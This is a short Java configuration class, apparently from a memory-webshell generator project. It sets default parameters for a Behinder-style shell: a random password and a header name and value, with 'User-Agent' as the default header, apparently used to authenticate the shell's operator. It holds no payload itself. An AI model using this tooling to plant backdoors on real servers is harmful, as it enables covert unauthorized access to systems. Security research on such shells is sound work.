package com.reajason.javaweb.memshell.config;

import com.reajason.javaweb.utils.CommonUtil;
import lombok.*;
import lombok.experimental.SuperBuilder;

/**
 * @author ReaJason
 * @since 2024/12/21
 */
@Getter
@SuperBuilder
@NoArgsConstructor
@AllArgsConstructor
@ToString
public class BehinderConfig extends ShellToolConfig {
    @Builder.Default
    private String pass = CommonUtil.getRandomString(8);
    @Builder.Default
    private String headerName = "User-Agent";
    @Builder.Default
    private String headerValue = CommonUtil.getRandomString(8);
}
